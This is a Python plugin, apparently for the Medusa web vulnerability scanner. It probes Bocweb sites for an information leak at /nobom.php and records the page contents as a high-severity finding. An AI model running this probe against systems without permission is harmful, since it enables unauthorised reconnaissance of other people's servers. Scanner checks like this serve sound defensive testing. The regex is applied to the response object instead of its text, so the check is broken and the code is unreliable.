#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import re
from ClassCongregation import VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-1-19"  # 插件编辑时间
        self.info['disclosure']='2015-05-16'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "BocwebNetworkSystemSensitiveInformationLeakage"  # 插件名称
        self.info['name'] ='Bocweb网络系统敏感信息泄露' #漏洞名称
        self.info['affects'] = "Bocweb"  # 漏洞组件
        self.info['desc_content'] = "bocweb（博采网络）/nobom.php敏感信息泄露。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    try:
        payload = '/nobom.php'
        payload_url = url+ payload
        resp = requests.get(payload_url,headers=Headers, timeout=6, proxies=proxies,verify=False)
        con = resp.text
        code = resp.status_code
        m = re.findall(r'<br>filename[^<]+BOM Not Found. <br>', resp)
        if code==200 and m:
            Medusa = "{}存在Bocweb网络系统敏感信息泄露漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp, **kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类